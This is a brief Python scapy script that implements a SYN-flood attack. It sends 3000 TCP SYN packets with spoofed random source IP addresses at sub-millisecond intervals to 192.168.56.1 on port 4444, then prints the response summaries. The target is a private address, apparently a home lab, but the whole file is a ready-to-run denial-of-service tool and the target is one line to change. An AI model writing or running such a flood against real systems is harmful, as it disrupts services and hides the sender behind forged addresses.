 # coding: utf-8
from scapy.all import *

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def pkt():
    topt=[('Timestamp', (10,0))]
    p=IP(src=RandIP(),dst="192.168.56.1",id=1111,ttl=99)/TCP(sport=RandShort(),dport=4444,seq=12345,ack=1000,window=1000,flags='S',options=topt)/"SYNFlood"
    return p

ans,unans=srloop(pkt(),inter=0.0001,retry=2,timeout=4,count=3000)

ans.summary()
unans.summary()